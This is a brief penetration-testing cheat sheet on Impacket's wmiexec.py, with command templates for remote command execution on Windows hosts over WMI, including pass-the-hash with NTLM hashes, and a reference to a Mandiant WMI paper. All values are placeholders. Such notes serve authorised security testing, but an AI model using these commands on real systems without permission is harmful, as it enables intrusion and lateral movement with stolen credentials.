# Unix Shell

## 01 - Impacket

- Authenticate via impacket script with WMIExec

`$ wmiexec.py <username>:<password>@<IP> [-codecs <codec>]`

- Pass the Hash

```
$ wmiexec.py <username>@<IP> -hashes <ntlm_hash> [-codecs <codec>]

$ wmiexec.py <domain_name>/<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<nt_hash> [-codecs <codec>]

$ wmiexec.py <domain_name>/<username>@<IP> -hashes :<nt_hash> [-codecs <codec>]
```

---
## References

- [Mandiant: Windows Management Instrumentation](https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf)